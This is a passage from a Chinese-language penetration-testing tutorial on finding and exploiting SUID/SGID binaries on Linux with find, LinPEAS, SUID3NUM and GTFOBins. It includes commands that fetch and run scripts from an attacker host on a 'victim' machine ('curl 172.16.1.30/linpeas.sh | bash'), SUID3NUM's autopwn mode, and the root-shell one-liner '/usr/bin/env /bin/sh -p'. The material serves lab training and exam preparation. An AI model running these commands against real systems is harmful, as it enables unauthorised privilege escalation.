<p>请注意，我并没有突出显示上面所有易受攻击的 SUID 二进制文件。</p>
</blockquote>
<p>一旦我们发现一些有趣的二进制文件，我们就可以开始检查它们是否可以使用 GTFObins 进行利用。</p>
<p>在我们开始之前，让我们快速回顾一下如何枚举 SGID 二进制文件，然后再看看工具（LinPEAs 和 SUID3NUM）枚举 SUID 二进制文件的效果如何。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="22枚举-sgid-二进制文件"><strong><div id="id2.2">2.2、枚举 SGID 二进制文件</div></strong><a href="#22枚举-sgid-二进制文件" class="hash-link" aria-label="22枚举-sgid-二进制文件的直接链接" title="22枚举-sgid-二进制文件的直接链接">​</a></h4>
<p>说到 SGID 二进制文件，查找它们的命令与 SUID 非常相似：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">find / -type f -perm -2000 2&gt;/dev/null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">find / -type f -perm -g=s 2&gt;/dev/null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">find / -type f -perm -2000 -user root -ls 2&gt;/dev/null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">find / -type f -perm -g=s -user root -ls 2&gt;/dev/null</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190625689-968752507-8058f133e1f24df9a42c0b74944fb9e0.png" width="717" height="397" class="img_ev3q"></p>
<p>以上输出这些都是系统默认值，因为我确实也没有设置带有 SGID 位的二进制文件（也就是说本文所涉及的提权方式都是在 SUID 权限下进行的）。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="3寻找-suidsgid-二进制文件--自动工具"><strong><div id="id3">3、寻找 SUID/SGID 二进制文件 – 自动工具</div></strong><a href="#3寻找-suidsgid-二进制文件--自动工具" class="hash-link" aria-label="3寻找-suidsgid-二进制文件--自动工具的直接链接" title="3寻找-suidsgid-二进制文件--自动工具的直接链接">​</a></h2>
<p>既然我们已经了解了如何手动枚举 SUID 二进制文件，那么接下来我们将通过使用工具 LinPEAS 和 SUID3NUM 来了解更快速的方法。</p>
<p>这两种工具都可以相当准确地知道哪些 SUID 二进制文件是<strong>默认的、还是有趣的或自定义的</strong>。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="31枚举-suidsgid-二进制文件--linpeas"><strong><div id="id3.1">3.1、枚举 SUID/SGID 二进制文件 – LinPEAS</div></strong><a href="#31枚举-suidsgid-二进制文件--linpeas" class="hash-link" aria-label="31枚举-suidsgid-二进制文件--linpeas的直接链接" title="31枚举-suidsgid-二进制文件--linpeas的直接链接">​</a></h4>
<p>LinPEAS 是一款终极的后漏洞枚举工具，此处我们直接在受害者主机内存中执行。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">curl 172.16.1.30/linpeas.sh | bash</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>待脚本运行完成后，我们可以对结果进行梳理，看看 LinPEAS 是如何更好地枚举我们要寻找的东西。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="311枚举-suid-二进制文件"><strong><div id="id3.1.1">3.1.1、枚举 SUID 二进制文件</div></strong><a href="#311枚举-suid-二进制文件" class="hash-link" aria-label="311枚举-suid-二进制文件的直接链接" title="311枚举-suid-二进制文件的直接链接">​</a></h6>
<p>对于 SUID/SGID 二进制文件，我们需要向下滚动到 <strong>Interesting Files</strong> 部分。在那里的第一个子部分是 <strong>SUID</strong>。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190637705-837875090-3270af3d814ea9ecfe303cc9da51eccc.png" width="1024" height="671" class="img_ev3q"></p>
<p>在这里我们可以看到 LinPEAS 在查找<strong>有趣的</strong> SUID 二进制文件方面做得很好。</p>
<p>首先，它发现了六个已设置 SUID 位的标准二进制文件（这些标准文件默认清况下是不会被设置 SUID 位的）且都是红色/黄色标记，因为每个文件的漏洞都可以在 GTFObins 上找到。</p>
<p>接下来，还可以看到 LinPEAS 发现了另外四个令我们感兴趣的二进制文件，因为它们是“unknown”，这通常意味着这些是自定义 SUID 二进制文件，值得进一步检查。</p>
<p>在文章的开头，我们提到一共会有十个例子。在这里，我们可以看到 LinPEAS 能够枚举出我们要利用的所有十个二进制文件。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="312枚举-sgid-二进制文件"><strong><div id="id3.1.2">3.1.2、枚举 SGID 二进制文件</div></strong><a href="#312枚举-sgid-二进制文件" class="hash-link" aria-label="312枚举-sgid-二进制文件的直接链接" title="312枚举-sgid-二进制文件的直接链接">​</a></h6>
<p>继续向下滚动我们将找到 SGID 子部分，在这里我们可以看到所有 SGID 二进制文件。如前所述，这些文件都是默认的，并没有发现任何有趣的内容。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190626603-878494289-2673a73fb1a7c38b09be0abd2504b21c.png" width="955" height="468" class="img_ev3q"></p>
<p>接下来，让我们看看 SUID3NUM 在枚举 SUID 二进制文件方面的表现如何。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="32枚举-suid-二进制文件--suid3num"><strong><div id="id3.2">3.2、枚举 SUID 二进制文件 – SUID3NUM</div></strong><a href="#32枚举-suid-二进制文件--suid3num" class="hash-link" aria-label="32枚举-suid-二进制文件--suid3num的直接链接" title="32枚举-suid-二进制文件--suid3num的直接链接">​</a></h4>
<p>我们将用来枚举 SUID 二进制文件的第二个工具是 SUID3NUM。这是一个很棒的工具，因为它是专门为枚举 SUID 二进制文件而创建的。但这还不是全部，它还提供了可用于提升权限的命令（命令从 GTFOBins 中提取）。</p>
<p>这还不是最好的部分，SUID3NUM 还具有内置的 autopwn 功能，可以通过 <strong>-e</strong> 开关激活！</p>
<blockquote>
<p>在 OSCP 考试中也使用此工具，只要您不使用自动利用功能。</p>
</blockquote>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="321下载并执行-suid3num"><strong><div id="id3.2.1">3.2.1、下载并执行 SUID3NUM</div></strong><a href="#321下载并执行-suid3num" class="hash-link" aria-label="321下载并执行-suid3num的直接链接" title="321下载并执行-suid3num的直接链接">​</a></h6>
<p>我们可以从 <a href="https://github.com/Anon-Exploiter/SUID3NUM" target="_blank" rel="noopener noreferrer">GitHub</a> 仓库中获取 SUID3NUM 的副本，下载脚本的副本后，我们可以使用攻击者机器上已运行的 HTTP 服务器将脚本下载到受害者机器上。</p>
<blockquote>
<p>请注意，SUID3NUM 是一个 Python 脚本，因此需要在受害者主机上安装 Python2 或 Python3 才能运行。</p>
</blockquote>
<p>这次，我们不会将该脚本直接下载到内存中，而是将其下载到磁盘。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /dev/shm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">curl 172.16.1.30/suid3num.py -o suid3num.py</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>将脚本的副本下载到受害者身上后，我们需要授予它执行权限。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">chmod 755 /dev/shm/suid3num.py</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190626324-723931428-a7b0f38fbf8ed4efa16e4b5dfa6ba115.png" width="655" height="141" class="img_ev3q"></p>
<p>现在一切准备就绪，我们只需运行脚本，看看它能找到什么。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 ./suid3num.py</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190626788-564723940-5ad2e4b162219a775c23dfc9464db071.png" width="524" height="132" class="img_ev3q"></p>
<p>运行脚本后，我们可以看到它所做的第一个检查是查找主机上的所有 SUID 二进制文件，紧接着神奇的事情就发生了。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="322回顾调查结果"><strong><div id="id3.2.2">3.2.2、回顾调查结果</div></strong><a href="#322回顾调查结果" class="hash-link" aria-label="322回顾调查结果的直接链接" title="322回顾调查结果的直接链接">​</a></h6>
<p>当我们向下滚动 SUID 二进制文件的完整列表时，我们可以看到脚本将其发现分为以下部分：</p>
<ul>
<li><strong>默认二进制文件</strong> – 这些文件并不脆弱，我们也对其不感兴趣。</li>
</ul>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190626122-586885548-9074b24bc956b0d643c50834f1736235.png" width="409" height="421" class="img_ev3q"></p>
<ul>
<li><strong>自定义 SUID 二进制文件</strong> – SUID3NUM 将所有有趣和自定义的二进制文件都标记为自定义。</li>
</ul>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190625361-597387570-fc0320131323244cedcc17887669895b.png" width="369" height="207" class="img_ev3q"></p>
<ul>
<li><strong>GTFOBins 列表中的 SUID 二进制文件</strong> – SUID3NUM 引用 GTFOBins，让我们知道是否有任何二进制文件被列出并因此可被利用。</li>
</ul>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190626276-20981126-2e4b4081707aba27a8f894025ce1a98a.png" width="530" height="142" class="img_ev3q"></p>
<ul>
<li><strong>手动利用</strong> – SUID3NUM 直接从 GTFOBins 为某些可利用的二进制文件提供利用方法。</li>
</ul>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190625934-584964793-7bfc71a65b9b0007705563dcb8ed2222.png" width="557" height="292" class="img_ev3q"></p>
<ul>
<li><strong>无害的 SUID 二进制文件</strong> – 这些也是从 GTFObins 中提取的漏洞，只不过这些漏洞可以用一个命令来利用。</li>
</ul>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190625660-2070725433-a128afe37c8b06fb9733068e9f582744.png" width="636" height="100" class="img_ev3q"></p>
<p>Awesome！这个脚本在枚举 SUID 二进制文件方面确实很出色。我想说它甚至比 LinPEAS 更好，因为它是专门为这项任务而设计的。</p>
<p>更重要的是，它同时还提供了可供测试的漏洞命令，这是一个很大的优势。</p>
<p>在我们继续讨论漏洞利用示例之前，让我们快速测试一下自动漏洞利用功能并看看会发生什么。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="323将-autopwn-开关拨至-on"><strong><div id="id3.2.3">3.2.3、将 AutoPwn 开关拨至 ON</div></strong><a href="#323将-autopwn-开关拨至-on" class="hash-link" aria-label="323将-autopwn-开关拨至-on的直接链接" title="323将-autopwn-开关拨至-on的直接链接">​</a></h6>
<p>如前所述，SUID3NUM 可以通过在运行脚本时应用 <strong>-e</strong> 开关以自动利用易受攻击的 SUID 二进制文件。</p>
<p>那么让我们看看它在我们的处境下会做什么，因为我们确实有多个易受攻击的二进制文件。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 ./suid3num.py -e</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190625545-1973922321-197be81ad6196647d1958aafba98b8af.png" width="352" height="151" class="img_ev3q"></p>
<p>看起来它首先测试了“无害”的，并且在第一次尝试使用 env 二进制文件时成功将权限提升到 root 。</p>
<p>Cool！这真是一个查找或利用 SUID 二进制文件的绝佳工具。</p>
<blockquote>
<p>需要注意的是，自动利用功能是在发现 GTFOBins 上列出了易受攻击的二进制文件时才可用。如果二进制文件是自定义的或未在 GTFObins 上列出，则无法自动利用。</p>
</blockquote>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="4利用-suid-二进制文件--gtfobins"><strong><div id="id4">4、利用 SUID 二进制文件 – GTFOBins</div></strong><a href="#4利用-suid-二进制文件--gtfobins" class="hash-link" aria-label="4利用-suid-二进制文件--gtfobins的直接链接" title="4利用-suid-二进制文件--gtfobins的直接链接">​</a></h2>
<p>为了启动利用示例，我们将利用设置了 SUID 位的六个有趣的标准二进制文件中的每一个。</p>
<p>对于每个非默认 SUID 二进制文件（是默认命令但被更改过），我们将参考 <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer" title="GTFOBins">GTFOBins</a> 来查找漏洞。</p>
<p>对于这些示例，了解 GTFOBins 是什么以及它如何工作非常重要，因此让我们快速回顾一下。</p>
<p>GTFOBins 是精选的 Unix 二进制文件列表，可用于绕过错误配置的系统中本地安全限制。</p>
<p>对于 GTFOBins 上的所有可用漏洞，它们都有一个共同点：假定命令都以 root 身份执行。</p>
<p>话虽如此，但 GTFOBins 针对我们可能遇到的不同情况（sudo、SUID 等）也展示了不同的技术。</p>
<p>无论如何，当谈到 SUID 时，我们总是以 root 身份执行二进制文件，这意味着我们不应该将自己限制在 GTFObins 上提供的 “SUID” 漏洞上。</p>
<p>还要注意的是，并非每个易受攻击的 SUID 二进制文件都会立即产生 root shell。因此，我们将分三部分回顾如何利用这六个二进制文件：（1）易 shell 二进制文件（2）文件读/写二进制文件（3）需要一些创造力才能利用的二进制文件。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="41利用-easy-shell-二进制文件--envfind"><strong><div id="id4.1">4.1、利用 Easy Shell 二进制文件 – env/find</div></strong><a href="#41利用-easy-shell-二进制文件--envfind" class="hash-link" aria-label="41利用-easy-shell-二进制文件--envfind的直接链接" title="41利用-easy-shell-二进制文件--envfind的直接链接">​</a></h4>
<p>某些 SUID 二进制文件极易被利用，只需一个命令即可直接进入 root shell。这类二进制文件的两个示例是 <strong>env</strong> 和 <strong>find</strong>。</p>
<p>让我们前往 GTFOBins 并查看其中的每一个，从 <a href="https://gtfobins.github.io/gtfobins/env/" target="_blank" rel="noopener noreferrer" title="环境">env</a> 开始。</p>
<p>检查此二进制文件的 SUID 漏洞，显示以下内容：</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190625739-1545179948-1317982215f234c617d8e6683aed5d56.png" width="825" height="274" class="img_ev3q"></p>
<p>大多数情况下，GTFObins 建议创建本地 SUID 副本；但是，我们不需要这样做。因为，我们当前的环境中可以直接使用二进制文件的绝对路径。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/env /bin/sh -p</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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